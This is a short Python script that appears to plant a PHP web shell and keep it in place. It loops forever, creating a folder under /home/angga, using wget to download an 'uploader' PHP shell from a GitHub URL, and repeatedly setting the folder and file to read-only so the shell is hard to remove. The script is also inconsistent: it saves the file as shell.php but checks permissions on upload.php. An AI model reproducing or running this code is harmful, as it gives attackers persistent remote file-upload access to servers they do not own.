import os
import os.path
import time

def create():
    while True:
        f = os.path.exists('/home/angga/contoh_folder')
        folder = "/home/angga/"
        folderBaru = "contoh_folder/"
        shell = "https://raw.githubusercontent.com/pyorin/uploaderphp/main/upload.php"
        shell_file = "upload.php"
        
        if f == True:
            folderGw = folder + folderBaru
            folder_mode = os.stat(folderGw).st_mode
            file_mode = os.stat(folderGw+shell_file).st_mode

            if folder_mode & 0o777 != 0o555:
                os.chmod(folderGw, 0o555)
            else:
                pass
            time.sleep(1)

            if file_mode & 0o777 != 0o444:
                os.chmod(folderGw+shell_file, 0o0444)
            else:
                pass
            time.sleep(1)

        else:
            os.system("cd {}; mkdir {}".format(folder, folderBaru))
            os.system("cd {}{}; wget {} -O shell.php".format(folder,folderBaru, shell))
            time.sleep(1)
create()
